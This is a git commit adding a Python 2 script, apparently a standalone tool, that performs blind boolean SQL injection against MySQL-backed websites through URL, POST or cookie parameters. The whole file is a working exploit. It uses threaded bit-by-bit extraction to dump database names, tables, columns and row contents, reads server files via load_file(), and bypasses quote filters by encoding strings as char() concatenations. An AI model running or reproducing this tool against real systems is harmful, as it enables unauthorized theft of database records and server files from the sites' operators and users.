3c8d19f34e1f4482c976ac3f0ffe55ebb01ad5d4
agix <florian.gaultier@gmail.com>
2014-03-25 16:51:20 +0100

    MySQL tool

---
+++ mysql-truefalse.py
@@ -0,0 +1,340 @@
+#!/usr/bin/env python
+
+import urllib2
+import urllib
+import string
+import re
+import os
+import sys
+import math
+from threading import Thread
+from Queue import Queue
+from optparse import OptionParser
+
+class MysqlTrueFalse:
+	def withoutQuotes(self,chaine):
+		return 'concat(%s)' % ','.join(['char(0x%x)' % ord(i) for i in chaine[1:-1]]) 
+
+	def tricks(self,sqli):
+		if self.modif == "1":
+			while re.search("'",sqli):
+				string = re.search("('.+?')",sqli).group(0)
+				sqli = re.sub(string,self.withoutQuotes(string),sqli)
+
+		return sqli
+		
+	def __init__(self, url, post, cookie,verbose=False,error="",modification="0"):
+		self.target = 0
+		self.limit=1
+		self.stat=0
+		self.modif = modification
+		if not re.match("http",url):
+			print "-u http<url>"
+			sys.exit();
+
+		self.url = re.sub("1=.?1","1=1 W00T",url)
+		self.post = re.sub("1=.?1","1=1 W00T",post)
+		self.cookie = re.sub("1=.?1","1=1 W00T",cookie)
+			
+		if re.search("1=.?1",self.url):
+			self.target = 1
+			self.inject = self.url
+			spet = re.findall("1=.?1",url)
+		elif re.search("1=.?1",self.post):
+			self.target = 2
+			self.inject = self.post
+			spet = re.findall("1=.?1",post)
+		elif re.search("1=.?1",self.cookie):
+			self.target = 3
+			self.inject = self.cookie
+			spet = re.findall("1=.?1",cookie)
+
+		if self.target == 0:
+			print "type 1=1 where to inject"
+			sys.exit();
+			
+		self.verbose = verbose
+		self.error = error
+		if spet[0][2:3]!="1":
+			self.speChar=spet[0][2:3]
+		else:
+			self.speChar=""
+		self.testInjection()
+			
+	def testInjection(self):
+		self.valide = self.doRequest()
+		if self.error=="":
+			valide2 = self.doRequest()
+			if self.valide != valide2:
+				print "Hard to deteremine the good page"
+				print "Try to add error option to help (option --Error)"
+				sys.exit()
+			print "Found valid page... You can add error option to improve (option --Error)"
+			
+		self.changeInject("1=2")
+		
+		if self.testTrueFalse():
+			print "Bad injection ?"
+			sys.exit()
+		print "Injection seems good, let's check if information_schema exists..."
+
+		string = self.tricks("(select count(distinct(table_schema)) from information_schema.columns where table_schema='information_schema')=1")
+		self.changeInject(string)
+
+		if not(self.testTrueFalse()):
+			print "information_schema not found, sorry I can't do anything without it."
+			sys.exit()
+		print "Everything seems good. Dump can begin."
+
+	def changeInject(self,new):
+		self.inject = re.sub("1=1",new,self.inject)
+
+	def value(self, request, num = 0, size=0, condition = ""):
+		
+		if size==0:
+			size=self.length(request  + condition, num)
+			print "%d long" %size
+		val=""
+		for i in range(size):
+			z=0
+			q=Queue()
+			t=[]
+			for j in range(8):
+				if self.limit==1:
+					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + condition + " limit " + str(num) + ",1), " + str(i+1) + ", 1))",j,q)))
+				else:
+					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + condition + "), " + str(i+1) + ", 1))",j,q)))
+				t[j].start()
+			for j in range(8):
+				t[j].join()
+				z+=q.get()
+			val+=chr(z)
+			print val
+		return val
+
+	def length(self, request, num = 0, condition = ""):
+		if self.limit==1:
+			return self.count("select length((" + request  + condition + " limit " + str(num) + ",1))",0,20)
+		else:
+			return self.count("select length((" + request  + condition + "))",0,20)
+	
+	def bitGuessing(self, request, bit, queue, condition = ""):
+		string = self.tricks("(substring(lpad(conv("+request+condition+",10,2),8,char(0x30)),"+str(bit+1)+",1))=1")
+		self.changeInject(string)
+		if self.testTrueFalse():
+			queue.put(1<<(7-bit))
+		else:
+			queue.put(0)
+
+
+	def count(self, request, begin = 0, end = 100, condition = ""):
+		a=0
+		min=begin
+		max=end
+		nombre=self.dicho(min,max)
+		while a==0:
+			string = self.tricks("(" + request + condition + ")<" + str(nombre))
+			self.changeInject(string)
+			if self.testTrueFalse():
+				max=nombre
+			else:
+				min=nombre
+			nombre=self.dicho(min,max)
+			if (max-min)<2:
+				string = self.tricks("(" + request + condition + ")=" + str(min))
+				self.changeInject(string)
+				if self.testTrueFalse():
+					nombre=min
+					a=1
+				else:
+					string = self.tricks("(" + request + condition + ")=" + str(max))
+					self.changeInject(string)
+					if self.testTrueFalse():
+						nombre=max
+						a=1
+					else:
+						print "Try more than %d"%max
+						max+=end
+						nombre = self.dicho(min,max)
+		return nombre
+			
+	def dicho(self,min,max):
+		return int(math.ceil(min+((max-min)/2))) 
+		
+	def testTrueFalse(self):
+		if self.error == "":
+			if self.doRequest() == self.valide:
+				return True
+			else:
+				return False
+		else:
+			if re.search(self.error,self.doRequest()):
+				return False
+			else:
+				return True
+
+	def doRequest(self):
+		if self.target == 1:
+			if re.search("W00T", self.inject):
+				url=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
+				post=self.post
+				cookie=self.cookie
+				self.inject = self.url
+			if self.verbose:
+				print "Url : "+url
+				print "Post : "+post
+				print "Cookie : "+cookie
+		elif self.target == 2:
+			if re.search("W00T", self.inject):
+				url=self.url
+				post=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
+				cookie=self.cookie
+				self.inject = self.post
+			if self.verbose:
+				print "Url : "+url
+				print "Post : "+post
+				print "Cookie : "+cookie
+		elif self.target == 3:
+			if re.search("W00T", self.inject):
+				url=self.url
+				post=self.post
+				cookie=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
+				self.inject = self.cookie
+			if self.verbose:
+				print "Url : "+url
+				print "Post : "+post
+				print "Cookie : "+cookie
+
+		request=urllib2.Request(url.replace(" ", "%20"))
+		request.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0")
+		request.add_header("Cookie",cookie.replace(" ", "%20"))
+		request.add_data(post.replace(" ", "%20"))
+		try:
+			page=urllib2.urlopen(request)
+			result = page.read()
+		except:
+			result = "404"
+		
+
+		self.stat+=1
+		return result
+
+	def conditionRequest(self,request,condition):
+		if condition!="":
+			if re.search("where",request):
+				return request+" and "+condition
+			else:
+				return request+" where "+condition
+		else:
+			return request
+
+	def dump(self, request, begin, end):
+		dump=[]
+		for i in range(begin,end):
+			dump.append(self.value(request,i))
+		return dump
+
+	def countDB(self,condition=""):
+		request=self.conditionRequest("select count(distinct(table_schema)) from information_schema.columns where table_schema!='information_schema'",condition)
+		return self.count(request)
+
+	def dumpDB(self, begin = 0, end = 0, condition=""):
+		request=self.conditionRequest("select distinct(table_schema) from information_schema.columns where table_schema!='information_schema'",condition)
+		if end==0:
+			end=self.countDB(condition)
+		print "There is %d databases with condition : %s"%(end,condition)
+		return self.dump(request,begin,end)
+
+	def dumpFile(self, file, begin = 0, end = 0):
+		self.limit=0
+		self.changeInject(self.tricks("!isnull(load_file('%s'))"%file))
+		if not(self.testTrueFalse()):
+			print "%s doesn't exist."%file
+			sys.exit(0)
+		request=self.conditionRequest("load_file('%s')"%file,'')
+		end=1
+		return self.dump(request,begin,end)
+
+	def dumpSpecial(self, function, begin = 0, end = 0):
+		self.limit=0
+		request=self.conditionRequest(function,'')
+		end=1
+		return self.dump(request,begin,end)
+
+	def countTables(self,database,condition=""):
+		request=self.conditionRequest("select count(distinct(table_name)) from information_schema.columns where table_schema='"+database+"'",condition)
+		return self.count(request)
+
+	def dumpTables(self, database, begin = 0, end = 0, condition=""):
+		request=self.conditionRequest("select distinct(table_name) from information_schema.columns where table_schema='"+database+"'",condition)
+		if end==0:
+			end=self.countTables(database, condition)
+		print "There is %d tables in %s with condition : %s"%(end,database,condition)
+		return self.dump(request,begin,end)
+
+	def countColumns(self,database,table,condition=""):
+		request=self.conditionRequest("select count(distinct(column_name)) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
+		return self.count(request)
+
+	def dumpColumns(self, database, table, begin = 0, end = 0, condition=""):
+		request=self.conditionRequest("select distinct(column_name) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
+		if end==0:
+			end=self.countColumns(database, table, condition)
+		print "There is %d columns in %s.%s with condition : %s"%(end,database,table,condition)
+		return self.dump(request,begin,end)
+
+	def countEntries(self, database, table, column, condition=""):
+		request=self.conditionRequest("select count(distinct("+column+")) from "+database+"."+table,condition)
+		return self.count(request)
+
+	def dumpEntries(self, database, table, column, begin = 0, end = 0, condition=""):
+		request=self.conditionRequest("select distinct("+column+") from "+database+"."+table,condition)
+		if end==0:
+			end=self.countEntries(database, table, column, condition)
+		print "There is %d entries in %s.%s, column %s with condition : %s"%(end,database,table,column,condition)
+		return self.dump(request,begin,end)
+
+	def getStat(self):
+		return self.stat
+
+		
+if __name__ == "__main__":
+	parser = OptionParser()
+	parser.add_option("-u", "--url", action="store", type="string", dest="url", default="", help="url where sql injection was found with 1=.?1 where injection is")
+	parser.add_option("-d", "--database",	action="store", type="string", dest="database",default="", help="Dump table from database")
+	parser.add_option("-t", "--table",	action="store", type="string", dest="table",default="",	help="Dump colonne from table and database")
+	parser.add_option("-c", "--colonne", action="store", type="string", dest="colonne",default="", help="Dump result from column, table and database")
+	parser.add_option("-f", "--file", action="store", type="string", dest="file",default="", help="Try to dump load_file()")
+	parser.add_option("-S", "--Special", action="store", type="string", dest="special",default="", help="dump special function (@@version...)")
+	parser.add_option("-p", "--post",	action="store", type="string", dest="post",default="", help="Add post data with 1=.?1 where injection is")
+	parser.add_option("-s", "--session", action="store", type="string", dest="cookie",default="", help="Add cookie data with 1=.?1 where injection is")
+	parser.add_option("-E", "--Error", action="store", type="string", dest="error",default="",	help="If hard to determine good page, give some strings in 1=2 page")
+	parser.add_option("-v", "--verbose", action="store_true", dest="verbose",default=False, help="Print url request")
+	parser.add_option("-b", "--begin", action="store", type="string", dest="begin",default="0",	help="Start dumping with the <begin> line")
+	parser.add_option("-e", "--end", action="store", type="string", dest="end",default="0", help="Finish dumping with the <end> line")
+	parser.add_option("-C", "--Condition", action="store", type="string", dest="condition",default="", help="Specify condition ex : -C 'login=admin'")
+	parser.add_option("-m", "--Modif", action="store", type="string", dest="modification",default="0", help="Specify tricks to bypass filter (type -m list to list the tricks)")
+
+	(options, args) = parser.parse_args()
+	if options.modification == "list":
+		print "-m 1 : transform strings with quotes to char(0x) concat"
+		sys.exit()
+	
+	myInjector = MysqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification)
+
+	if options.file!="":
+		myInjector.dumpFile(options.file,int(options.begin,10),int(options.end,10))
+	elif options.special!="":
+		myInjector.dumpSpecial(options.special,int(options.begin,10),int(options.end,10))
+	else:
+		if options.database=="":
+			print myInjector.dumpDB(int(options.begin,10),int(options.end,10),options.condition)
+		elif options.table=="":
+			print myInjector.dumpTables(options.database,int(options.begin,10),int(options.end,10),options.condition)
+		elif options.colonne=="":
+			print myInjector.dumpColumns(options.database,options.table,int(options.begin,10),int(options.end,10),options.condition)
+		else:
+			print myInjector.dumpEntries(options.database,options.table,options.colonne,int(options.begin,10),int(options.end,10),options.condition)
+	
+	
+	print "Done in %d request" %myInjector.getStat()
